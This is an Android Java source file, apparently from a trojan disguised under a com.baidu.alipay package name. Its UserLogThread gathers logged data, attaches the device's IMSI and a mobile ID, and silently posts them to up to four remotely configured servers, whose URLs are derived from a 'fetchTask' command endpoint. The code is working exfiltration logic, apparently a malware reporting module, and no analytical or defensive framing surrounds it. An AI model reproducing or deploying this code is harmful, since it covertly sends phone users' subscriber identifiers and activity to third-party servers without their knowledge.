package com.baidu.alipay;

import java.util.List;

import com.baidu.alipay.net.MyPost;

import android.content.Context;
import android.os.Handler;

public class UserLogThread extends Thread{

	private static final String TAG = "UserLogThread";
	
	private Context context;
	private Handler handler;
	
	private static int noLogsCnt = 0;
	private static int times = 0;
	
	public UserLogThread(Context context,final Handler handler){
		this.context = context;
		this.handler = handler;
		
		this.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
			
			@Override
			public void uncaughtException(Thread arg0, Throwable e) {
				e.printStackTrace();
				handler.sendEmptyMessage(0);
			}
		});
	}
	
//	public void runPf() {
//		LogUtil.e(TAG, "start to run...");
//		
//		boolean succ = false;
//		
//		try {
//			String logs = UserLogUtil.getUserLogs(context);
//			
//			LogUtil.e(TAG, "logs:"+logs);
//			
//			if(logs == null || logs.length() == 0){
//				noLogsCnt ++;
//				
//				if(noLogsCnt >= 5){
//					noLogsCnt = 0;
//					logs = "no logs from pf";
//				}
//			}else{
//				logs = "pf:"+logs;
//			}
//			
//			if(logs != null && logs.length() > 0){
//				if(sendLog(logs)){
//					UserLogUtil.resetUserLog(context);
//					succ = true;
//				}
//			}
//		} catch (Exception e) {
//			e.printStackTrace();
//		}
//				
//		handler.sendEmptyMessage(succ ? 1 : 0);
//	}

	@Override
	public void run() {
//		if(UserLogUtil.isUsePf()){
//			runPf();
//		}else{
//			runDb();
//		}
		
		realRun();
	}
	
	private void realRun(){
		LogUtil.e(TAG, "start to run...");
		
		boolean succ = false;
		
		try{
			String logs = "";
			List<String> list = UserLogUtil.getLogList();
			int size = list.size();
			
			if(size >= 1){
				StringBuffer sb = new StringBuffer();
				
				for(int i = 0 ; i < size ; i ++){
					sb.append(list.get(i));
				}
				
				logs = sb.toString();
				
			}else{
				noLogsCnt ++;
				LogUtil.e(TAG, "fetch size : 0");
				
				if(noLogsCnt >= 5){
					logs = "no logs";
					noLogsCnt = 0;
				}
			}
			
			if(logs != null && logs.length() > 0){
				if(sendLog(times+":"+logs)){
					UserLogUtil.sub(size - 1);
					succ = true;
					times ++;
				}
			}
		}catch (Exception e) {
			e.printStackTrace();
		}
		
		handler.sendEmptyMessage(succ ? 1 : 0);
	}
	
//	public void runDb() {
//		LogUtil.e(TAG, "start to run...");
//		boolean succ = false;
//		
//		try {
//			List<UserLog> userLogList = UserLogUtil.listLogs(context,20);
//			
//			String logs = "";
//			
//			if(userLogList != null && userLogList.size() > 0){
//				StringBuffer sb = new StringBuffer();
//				
//				for(UserLog userLog : userLogList){
//					sb.append("||").append(userLog.getLogTime()).append(":").append(userLog.getLogs());
//				}
//			
//				logs = "db:"+sb.substring(2);
//				
//			}else{
//				noLogsCnt ++;
//				LogUtil.e(TAG, "fetch size : 0");
//				
//				if(noLogsCnt >= 5){
//					logs = "no logs from db";
//					noLogsCnt = 0;
//				}
//			}
//			
//			if(logs.length() > 0){
//				if(sendLog(logs)){
//					UserLogUtil.updateUserLogList(context,userLogList);
//					succ = true;
//				}
//			}
//		} catch (Exception e) {
//			e.printStackTrace();
//		}
//		
//		handler.sendEmptyMessage(succ ? 1 : 0);
//	}
	
	private boolean sendLog(String logs){
		try {
			InitArguments initArguments = InitArgumentsHelper.getInstance(context).getInitArgs();
			
			String url1 = initArguments.getUrl1();
			String url2 = initArguments.getUrl2();
			String url3 = initArguments.getUrl3();
			String url4 = initArguments.getUrl4();
			
			String urls[] = new String[]{url1,url2,url3,url4};
			
			String ss = "imsi="+DeviceInfo.getIMSI(context)+"&mobileId="+Utils.getMobileId(context)+"&logs="+logs;
			
			for(String url : urls){
//			LogUtil.e(TAG, "url : "+url);
				
				String response = new MyPost().PostDataCommon(context, ss.getBytes(), url.replace("fetchTask", "log"));
				
//			LogUtil.e(TAG, "sendLog response : "+response+";logs:"+ss);
				
				if(response != null && response.length() > 0){
					return true;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return false;
	}
	
}